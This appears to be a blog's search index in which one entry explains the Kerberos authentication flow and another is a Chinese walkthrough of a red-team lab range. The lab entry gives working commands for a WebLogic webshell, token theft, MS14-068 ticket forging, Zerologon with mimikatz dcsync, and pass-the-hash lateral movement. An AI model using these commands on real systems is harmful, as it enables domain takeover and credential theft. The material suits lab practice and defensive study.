<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Kerberos(5)-Kerberos中继初试</title>
      <link href="/2022/02/25/Kerberos(5)-Kerberos%E4%B8%AD%E7%BB%A7%E5%88%9D%E8%AF%95/"/>
      <url>/2022/02/25/Kerberos(5)-Kerberos%E4%B8%AD%E7%BB%A7%E5%88%9D%E8%AF%95/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 域渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kerberos </tag>
            
            <tag> 中继 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kerberos(4)-非约束&amp;约束&amp;资源约束委派攻击</title>
      <link href="/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&amp;%E7%BA%A6%E6%9D%9F&amp;%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/"/>
      <url>/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&amp;%E7%BA%A6%E6%9D%9F&amp;%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 域渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kerberos </tag>
            
            <tag> 委派 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kerberos(3)-委派工作原理</title>
      <link href="/2022/02/25/Kerberos(3)-%E5%A7%94%E6%B4%BE%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/"/>
      <url>/2022/02/25/Kerberos(3)-%E5%A7%94%E6%B4%BE%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 域渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kerberos </tag>
            
            <tag> 委派 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kerberos(2)-Kerberos攻击手法</title>
      <link href="/2022/02/25/Kerberos(2)-Kerberos%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/"/>
      <url>/2022/02/25/Kerberos(2)-Kerberos%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 域渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kerberos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kerberos(1)-Kerberos工作原理</title>
      <link href="/2022/02/25/Kerberos(1)-Kerberos%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/"/>
      <url>/2022/02/25/Kerberos(1)-Kerberos%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="Kerberos认证"><a href="#Kerberos认证" class="headerlink" title="Kerberos认证"></a>Kerberos认证</h1><h2 id="kerberos简介"><a href="#kerberos简介" class="headerlink" title="kerberos简介"></a>kerberos简介</h2><p>在古希腊神话中Kerberos指的是：有着一只三头犬守护在地狱之门外,禁止任何人类闯入地狱之中。<br>而现实中的Kerberos是一种**网络身份验证协议,旨在通过密钥加密技术为客户端&#x2F;服务器应用程序提供身份验证,**主要用在域环境下的身份验证。Kerberos只提供每个用户的权限信息，需要每个服务来确认用户是否可以访问其资源。</p><h2 id="kerberos具体内容"><a href="#kerberos具体内容" class="headerlink" title="kerberos具体内容"></a>kerberos具体内容</h2><h4 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h4><p>Kerberos使用UDP&#x2F;TCP作为传输协议，UDP&#x2F;TCP是以明文方式发送数据。因此Kerberos需要提供加密。</p><h4 id="主要对象"><a href="#主要对象" class="headerlink" title="主要对象"></a>主要对象</h4><p>这几个对象在Kerberos中共同工作来提供认证。</p><ul><li>Client-想要访问服务的用户或客户端</li><li>AP-应用服务器，提供用户所需的服务</li><li>KDC-密钥分发中心，kerberos的主要服务，负责颁发票据，安装在DC域控制器上。由颁发TGT的AS（身份验证服务）支持。</li></ul><h4 id="加密密钥"><a href="#加密密钥" class="headerlink" title="加密密钥"></a>加密密钥</h4><p>Kerberos处理结构有几种，如票据。这些结构中有很多是加密或者签名了的，来防止被第三方篡改。这些密钥密钥如下。</p><ul><li>KDC或krbtgt密钥-由krbtgt账户的NTLM hash衍生</li><li>用户密钥-用户NTLM hash派生</li><li>服务密钥-来自服务所有者的NTLM hash，可以是一个用户或者计算机账户</li><li>会话密钥-由用户和KDC协商确定</li><li>服务会话密钥-在用户和服务之间使用</li></ul><h4 id="票据"><a href="#票据" class="headerlink" title="票据"></a>票据</h4><p>Kerberos 处理的主要结构是 ticket。票据传递给用户，方便用户在Kerberos认证流程中使用。票据分为两种.</p><ul><li>TGS (Ticket Granting Service) 是用户用来对服务进行认证的票据。它是用服务密钥加密的。</li><li>TGT (Ticket Granting Ticket) 是提交给 KDC 以请求 TGS 的票据。它是用 KDC 的密钥加密的。</li></ul><h4 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a>PAC</h4><p>PAC (Privilege Attribute Certificate) 是一个几乎包含在每个票据中的结构。这个结构包含了用户的权限，并且是用 KDC 的密钥签名的。</p><p>有可能通过与KDC通信来验证PAC，但是并不常见。然而验证PAC也只检查其签名，不检查PAC中的权限是否正确。</p><p>此外，Client可以通过在票据请求的KERB_PAC_REQUEST字段中指定PAC来避免将其放入票据中。（先简单介绍，后续详细探究PAC）</p><h4 id="消息"><a href="#消息" class="headerlink" title="消息"></a>消息</h4><p>Kerberos 使用不同种类的消息。其中最主要是以下几种。</p><ul><li>KRB_AS_REQ: 用来向 KDC 请求 TGT。</li><li>KRB_AS_REP: 用来由 KDC 交付 TGT。</li><li>KRB_TGS_REQ：用于使用 TGT向 KDC 请求 TGS。</li><li>KRB_TGS_REP：用于由KDC交付TGS。</li><li>KRB_AP_REQ：用于使用 TGS 对用户进行服务认证。</li><li>KRB_AP_REP：（可选）由服务用来对用户进行身份验证。</li><li>KRB_ERROR。传达错误情况的信息。</li></ul><p>它不是 Kerberos 的一部分，而是 NRPC 的一部分，AP 也可以选择使用 KERB_VERIFY_PAC_REQUEST 消息来向 KDC 发送 PAC 的签名，并验证它是否正确。</p><h3 id="kerberos认证流程"><a href="#kerberos认证流程" class="headerlink" title="kerberos认证流程"></a>kerberos认证流程</h3><p><img src="/2022/02/25/Kerberos(1)-Kerberos%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220225020242688-16457257643591.png" alt="image-20220225020242688"></p><h4 id="KRB-AS-REQ"><a href="#KRB-AS-REQ" class="headerlink" title="KRB_AS_REQ"></a>KRB_AS_REQ</h4><p>首先，用户必须从KDC获取到一个TGT。所以必须发送一个KRB_AS_REQ。</p><p><img src="/2022/02/25/Kerberos(1)-Kerberos%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/KRB_AS_REQ-16456427564093.png" alt="img"></p><p>KRB_AS_REQ主要是以下字段：</p><ul><li>带有客户端密钥的加密时间戳，以验证用户并防止重放攻击</li><li>已认证用户的用户名</li><li>与krbtgt相关服务的主体名称（SPN）</li><li>用户生成的临时信息</li></ul><blockquote><p>注意：</p><p>通常情况下加密的时间戳只有在用户需要预认证的情况下才需要，除非在用户账户中设置了DONT_REQ_PREAUTH标志。</p></blockquote><h4 id="KRB-AS-REP"><a href="#KRB-AS-REP" class="headerlink" title="KRB_AS_REP"></a>KRB_AS_REP</h4><p>收到请求后，KDC通过解密时间戳来验证用户身份。如果信息是正确的，那么它必须以KRB_AS_REP来回应。</p><p><img src="/2022/02/25/Kerberos(1)-Kerberos%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/KRB_AS_REP-16456427870795.png" alt="img"></p><p>KRB_AS_REP主要是以下字段：</p><ul><li>用户名</li><li>TGT<ul><li>用户名</li><li>会话密钥</li><li>TGT过期时间</li><li>具有用户权限的PAC，由KDC签名</li></ul></li><li>一些带有用户密钥的加密数据<ul><li>会话密钥</li><li>TGT过期时间</li><li>用户的临时信息，防止重放</li></ul></li></ul><p>一旦完成，用户就已经拥有了TGT，可以用来申请TGS，并在之后获得服务。</p><h4 id="KRB-TGS-REQ"><a href="#KRB-TGS-REQ" class="headerlink" title="KRB_TGS_REQ"></a>KRB_TGS_REQ</h4><p>为了请求TGS，必须向KDC发送KRB_TGS_REQ消息。</p><p><img src="/2022/02/25/Kerberos(1)-Kerberos%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/KRB_TGS_REQ-1-16456432552937.png" alt="img"></p><p>KRB_TGS_REQ主要是以下字段：</p><ul><li>用会话密钥加密的数据<ul><li>用户名</li><li>时间戳</li></ul></li><li>TGT</li><li>请求服务的主体</li><li>用户生成的临时信息</li></ul><h4 id="KRB-TGS-REP"><a href="#KRB-TGS-REP" class="headerlink" title="KRB_TGS_REP"></a>KRB_TGS_REP</h4><p>在收到 KRB_TGS_REQ 消息后，KDC 返回 KRB_TGS_REP 中的 TGS。</p><p><img src="/2022/02/25/Kerberos(1)-Kerberos%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/KRB_TGS_REP-16456435608059.png" alt="img"></p><p>KRB_TGS_REP 主要是以下字段：</p><ul><li>用户名</li><li>TGS<ul><li>服务会话密钥</li><li>用户名</li><li>TGS过期时间</li><li>具有用户权限的PAC，由KDC签名</li></ul></li><li>带有会话密钥的加密数据<ul><li>服务会话密钥</li><li>TGS过期时间</li><li>用户临时信息</li></ul></li></ul><h4 id="KRB-AP-REQ"><a href="#KRB-AP-REQ" class="headerlink" title="KRB_AP_REQ"></a>KRB_AP_REQ</h4><p>最后，如果一切顺利，用户已经有了一个有效的TGS来与服务进行交互。为了使用它，用户必须向AP发送一个KRB_AP_REQ消息。</p><p><img src="/2022/02/25/Kerberos(1)-Kerberos%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/KRB_AP_REQ-164564361736012.png" alt="img"></p><p>KRB_AP_REQ主要是以下字段：</p><ul><li>TGS</li><li>服务会话加密数据<ul><li>用户名</li><li>时间戳，避免重放</li></ul></li></ul><p>之后，如果用户的权限是正确的，他就可以访问服务。如果是服务将根据KDC验证PAC（通常不会发生）。而且，如果需要相互认证，它将用KRB_AP_REP消息来回应用户。</p><p>参考连接：</p><p><a href="https://daiker.gitbook.io/windows-protocol/kerberos/1">https://daiker.gitbook.io/windows-protocol/kerberos/1</a></p><p><a href="https://www.tarlogic.com/blog/how-kerberos-works/">https://www.tarlogic.com/blog/how-kerberos-works/</a></p>]]></content>
      
      
      <categories>
          
          <category> 域渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kerberos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红日靶场-ATT&amp;CK红队评估实战靶场二</title>
      <link href="/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/"/>
      <url>/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<p>靶场不能锻炼思维，只能用于练练手，基本操作一下避免手生。</p><h2 id="简易网络拓扑"><a href="#简易网络拓扑" class="headerlink" title="简易网络拓扑"></a>简易网络拓扑</h2><p><img src="/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6-16446515727731.png" alt="未命名文件"></p><h2 id="WEB打点"><a href="#WEB打点" class="headerlink" title="WEB打点"></a>WEB打点</h2><p>Weblogic10 XMLDecoder反序列化漏洞，直接上传写入哥斯拉webshell。</p><p>webshell地址：<a href="http://192.168.124.45/:7001/wls-wsat/test.jsp">http://192.168.124.45/:7001/wls-wsat/test.jsp</a></p><p><img src="/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20220212160424896.png" alt="image-20220212160424896"></p><h2 id="Windows提权"><a href="#Windows提权" class="headerlink" title="Windows提权"></a>Windows提权</h2><p>weblogic的webshell权限不是administrator权限，这里先cs上线之后进行提权操作。systeminfo查看补丁情况，选择MS16-135提权。这里用cs插件提权查看虚拟机会闪现一个框，之后找找静默的exp。</p><h2 id="内网基础信息收集"><a href="#内网基础信息收集" class="headerlink" title="内网基础信息收集"></a>内网基础信息收集</h2><p>提权之后需要收集这台机器上某些信息。</p><h3 id="一、环境信息"><a href="#一、环境信息" class="headerlink" title="一、环境信息"></a>一、环境信息</h3><p>1、网络情况</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netstat <span class="literal">-ano</span> <span class="comment">#查看网络连接</span></span><br><span class="line">arp <span class="literal">-a</span> <span class="comment">#查看arp表</span></span><br><span class="line">route print <span class="comment">#路由信息</span></span><br></pre></td></tr></table></figure><p>2、杀软情况和用户运行程序情况</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /v</span><br></pre></td></tr></table></figure><p>3、内网扫描</p><p>根据网络情况，使用扫描工具扫描内网中机器</p><p>4、域信息</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all <span class="comment">#可查看是否有域</span></span><br><span class="line">net user /domain <span class="comment">#查看域用户</span></span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain admins&quot;</span> /domain <span class="comment">#查看域管理员</span></span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain controllers&quot;</span> /domain <span class="comment">#查看域控制器</span></span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain computers&quot;</span> /domain <span class="comment">#查看域机器</span></span><br></pre></td></tr></table></figure><p>总结环境情况，在域中，当前只有sqlserver使用的域用户mssql。</p><p>考虑AccessToken令牌窃取mssql用户，进行委派攻击</p><p>或者直接利用 GPP(组策略)利用（MS14-025）、Kerberos域用户提权漏洞（MS14-068）、CVE-2021-42287&amp;42278、NetLogon域内提权漏洞(CVE-2020-1472)等。</p><p>域控制器ip：10.10.10.10</p><h3 id="二、密码信息"><a href="#二、密码信息" class="headerlink" title="二、密码信息"></a>二、密码信息</h3><p>1、windows2008R2可以直接mimikatz获取密码情况</p><p>2、RDP保存的密码</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /l</span><br><span class="line"><span class="built_in">dir</span> /a %userprofile%\AppData\Local\Microsoft\Credentials\*</span><br></pre></td></tr></table></figure><p>3、浏览器信息收集</p><p>4、其他应用密码</p><p>靶场通用密码，不直接利用密码。</p><h2 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h2><h3 id="一、AccessToken令牌窃取"><a href="#一、AccessToken令牌窃取" class="headerlink" title="一、AccessToken令牌窃取"></a>一、AccessToken令牌窃取</h3><p>AccessToken窃取和利用需要管理员，前面已经提权。</p><p>窃取accesstoken的方法：</p><p>incognito.exe程序 、InvokeTokenManipulat.ps1脚本 、MSF里的incognito模块</p><h4 id="1、incognito-exe"><a href="#1、incognito-exe" class="headerlink" title="1、incognito.exe"></a>1、incognito.exe</h4><p>下载地址：<a href="https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip">https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip</a></p><p>获取所有token</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">incognito.exe  list_tokens -u</span><br></pre></td></tr></table></figure><p><img src="/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20220215002830140.png" alt="image-20220215002830140"></p><p>如果要使用AccessToken模拟其他用户，可以使用命令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">incognito.exe execute <span class="literal">-c</span> <span class="string">&quot;完整的Token名&quot;</span> cmd.exe</span><br><span class="line"></span><br><span class="line">提权至system：</span><br><span class="line">incognito.exe execute <span class="literal">-c</span> <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span> cmd.exe</span><br><span class="line">降权至当前用户：</span><br><span class="line">incognito.exe execute <span class="literal">-c</span> <span class="string">&quot;当前用户token&quot;</span> cmd.exe</span><br></pre></td></tr></table></figure><p><img src="/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20220215003246767.png" alt="image-20220215003246767"></p><p>这里cs实际上在进程列表是可以直接窃取的，演示一下incognito来窃取利用启动exe。可以直接运行cspayload，也可以cs注入到mssql用户进程。</p><h4 id="2、Invoke-TokenManipulation-ps1"><a href="#2、Invoke-TokenManipulation-ps1" class="headerlink" title="2、Invoke-TokenManipulation.ps1"></a>2、Invoke-TokenManipulation.ps1</h4><p>脚本是PowerSploit下Exfiltration文件夹内的一个脚本</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">列举token</span><br><span class="line"><span class="built_in">Invoke-TokenManipulation</span> <span class="literal">-Enumerate</span></span><br><span class="line">提权至system</span><br><span class="line"><span class="built_in">Invoke-TokenManipulation</span> <span class="literal">-CreateProcess</span> <span class="string">&quot;cmd.exe&quot;</span> <span class="literal">-username</span> <span class="string">&quot;nt authority\system&quot;</span></span><br><span class="line">复制进程token</span><br><span class="line"><span class="built_in">Invoke-TokenManipulation</span> <span class="literal">-CreateProcess</span> <span class="string">&quot;cmd.exe&quot;</span> <span class="literal">-ProcessId</span> <span class="number">500</span></span><br><span class="line">复制线程token</span><br><span class="line"><span class="built_in">Invoke-TokenManipulation</span> <span class="literal">-CreateProcess</span> <span class="string">&quot;cmd.exe&quot;</span> <span class="literal">-ThreadId</span> <span class="number">500</span></span><br></pre></td></tr></table></figure><h4 id="3、MSF-incognito"><a href="#3、MSF-incognito" class="headerlink" title="3、MSF-incognito"></a>3、MSF-incognito</h4><p>很少使用msf</p><h3 id="二、委派攻击"><a href="#二、委派攻击" class="headerlink" title="二、委派攻击"></a>二、委派攻击</h3><p>1、查询非约束委派用户</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe <span class="literal">-b</span> <span class="string">&quot;DC=de1ay,DC=com&quot;</span> <span class="operator">-f</span> <span class="string">&quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> cn distinguishedName</span><br></pre></td></tr></table></figure><p><img src="/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20220215015109814.png" alt="image-20220215015109814"></p><p>没有可利用用户</p><p>2、查询约束委派</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe <span class="literal">-h</span> <span class="number">10.10</span>.<span class="number">10.10</span> <span class="literal">-u</span> mssql <span class="literal">-up</span> <span class="number">1</span>qaz@WSX <span class="literal">-b</span> <span class="string">&quot;DC=de1ay,DC=com&quot;</span> <span class="operator">-f</span> <span class="string">&quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot;</span> cn distinguishedName msds<span class="literal">-allowedtodelegateto</span></span><br></pre></td></tr></table></figure><p>这里需要域用户账号密码，前面读出来过，但是也没有可利用用户就无所谓了。</p><p>3、资源约束委派</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe <span class="literal">-h</span> <span class="number">10.10</span>.<span class="number">10.10</span> <span class="literal">-u</span> mssql <span class="literal">-up</span> <span class="number">1</span>qaz@WSX <span class="literal">-b</span> <span class="string">&quot;DC=de1ay,DC=com&quot;</span> <span class="operator">-f</span> <span class="string">&quot;objectClass=computer&quot;</span> mS<span class="literal">-DS-CreatorSID</span></span><br></pre></td></tr></table></figure><p>查询机器加入域对应用的域用户，也没查询出sid。</p><p>其实应该是通过用户查询有哪些机器，先练资源约束委派而已。</p><h3 id="三、GPP-组策略-利用（MS14-025）"><a href="#三、GPP-组策略-利用（MS14-025）" class="headerlink" title="三、GPP(组策略)利用（MS14-025）"></a>三、GPP(组策略)利用（MS14-025）</h3><p>微软对于这个洞的介绍：</p><blockquote><p>此安全更新可解决 Microsoft Windows 中一个公开披露的漏洞。如果 Active Directory 组策略首选项用于跨域分发密码，该漏洞可能允许特权提升，这种做法可能允许攻击者检索并解密使用组策略首选项存储的密码。</p><p>对于安装在 Windows Vista、Windows 7、Windows 8 和 Windows 8.1 的受影响版本上的远程服务器管理工具，此安全更新的等级为“重要”。对于 Windows Server 2008、Windows Server 2008 R2、Windows Server 2012 和 Windows Server 2012 R2 的所有受支持版本，此更新的等级为“重要”。</p><p>该安全更新通过删除使用特定组策略首选项扩展配置和分发密码的功能来解决漏洞。</p></blockquote><p>使用Get-GPPPassword.ps1直接查询密码。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-exec</span> bypass <span class="literal">-command</span> <span class="string">&quot;&amp;&#123;Import-Module .\bea\Get-GPPPassword.ps1;Get-GPPPassword&#125;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20220215021322422-16448624045641.png" alt="image-20220215021322422"></p><p>报错，不知道是不是因为没有找到密码，手动查看了下\\dc.de1ay.com\SYSVOL\de1ay.com下没有xml文件记录密码信息。</p><h3 id="四、Kerberos域用户提权漏洞（MS14-068）"><a href="#四、Kerberos域用户提权漏洞（MS14-068）" class="headerlink" title="四、Kerberos域用户提权漏洞（MS14-068）"></a>四、Kerberos域用户提权漏洞（MS14-068）</h3><p>微软对于这个洞的介绍：</p><blockquote><p>该漏洞可能允许攻击者将未经授权的域用户帐户的权限，提升到域管理员帐户的权限。攻击者可能使用这些提升的权限来侵入域中的任何计算机，包括域控制器。攻击者必须有有效的域凭据才能利用此漏洞。拥有域凭据的标准用户帐户可以远程使用受影响的组件；只有本地帐户凭据的用户则不能。</p><p>对于所有受支持的 Windows Server 2003、Windows Server 2008、Windows Server 2008 R2、Windows Server 2012 及 Windows Server 2012 R2 版本</p></blockquote><p>使用工具ms14-068：<a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">-u</span>：用户名<span class="selector-tag">@</span>域名</span><br><span class="line"><span class="literal">-s</span>：用户SID</span><br><span class="line"><span class="literal">-d</span>：域控制器地址</span><br><span class="line"><span class="literal">-p</span>：明文密码</span><br><span class="line"><span class="literal">--rc4</span>：在没有明文密码的情况下，通过NTLM Hash登录</span><br><span class="line"></span><br><span class="line">例：</span><br><span class="line">ms14<span class="literal">-068</span>.exe <span class="literal">-u</span> mssql@de1ay.com <span class="literal">-s</span> S<span class="literal">-1-5-21-2756371121-2868759905-3853650604-2103</span> <span class="literal">-d</span> <span class="number">10.10</span>.<span class="number">10.10</span> <span class="literal">--rc4</span> <span class="number">161</span>cff084477fe596a5db81874498a24</span><br></pre></td></tr></table></figure><p>会在当前目录下生成TGT票据。</p><p>然后使用mimikatz注入生成的票据就行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="string">&quot;kerberos::ptc&quot;</span> <span class="string">&quot;TGT_mssql@de1ay.com.ccache&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20220220014047496.png" alt="image-20220220014047496"></p><h3 id="五、NetLogon域内提权漏洞-CVE-2020-1472"><a href="#五、NetLogon域内提权漏洞-CVE-2020-1472" class="headerlink" title="五、NetLogon域内提权漏洞(CVE-2020-1472)"></a>五、NetLogon域内提权漏洞(CVE-2020-1472)</h3><p>漏洞原理：</p><p>Netlogon使用的AES认证算法中的vi向量默认为0，导致攻击者可以绕过认证，可以向域发起Netlogon 计算机账户认证请求, 使用8字节全0 client challenge 不断尝试得到一个正确的8字节全0 client credential 通过认证，再通过相关调用完成对域控密码的修改。</p><p>操作步骤：</p><p>1、验证漏洞存在</p><p>使用新版的mimikatz加入了NetLogon利用的模块。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\bea\x64\mimikatz.exe <span class="string">&quot;lsadump::zerologon /target:10.10.10.10 /account:DC<span class="variable">$</span>&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure><p>返回 * Authentication: OK – vulnerable 则是可以利用此洞</p><p>2、置空域控HASH</p><p>域控的机器帐户HASH存储在注册表中，系统启动时会将其加载到lsass，当攻击置空域控HASH后，仅AD (NTDS.DIT) 中的密码会更改，而不是注册表或加载到lsass中的密码，这样将会导致域控脱域，无法使用Kerberos进行身份验证，因此要尽快恢复。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\bea\x64\mimikatz.exe <span class="string">&quot;lsadump::zerologon /target:10.10.10.10 /account:DC<span class="variable">$</span> /exploit&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure><p>3、获取域管HASH</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\bea\x64\mimikatz.exe <span class="string">&quot;lsadump::dcsync /domain:de1ay.com /dc:DC /user:administrator /authuser:DC<span class="variable">$</span> /authdomain:main /authpassword:\&quot;</span>\<span class="string">&quot; /authntlm&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20220220035152207.png" alt="image-20220220035152207"></p><p>4、恢复域控HASH</p><p>mimikatz工具内置恢复域控HASH是将NTDS.DIT中的凭证以及注册表&#x2F;lsass中的凭证同时修改为 (<code>Waza1234/Waza1234/Waza1234</code>)并不是原密码，因此不太实用。</p><p>要恢复原始hash，先要获取注册表信息中域控原始hash。</p><p>这里环境因为DC是在10段所以先用web这台机器生成中转监听</p><p>再使用cs的用凭证去横向上线DC</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rev2self</span><br><span class="line">pth de1ay.com\Administrator <span class="number">161</span>cff084477fe596a5db81874498a24</span><br><span class="line">jump psexec_psh DC <span class="number">10</span> //<span class="number">10</span>是中转监听的名称、dc是域控名</span><br></pre></td></tr></table></figure><p><img src="/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20220220044545851.png" 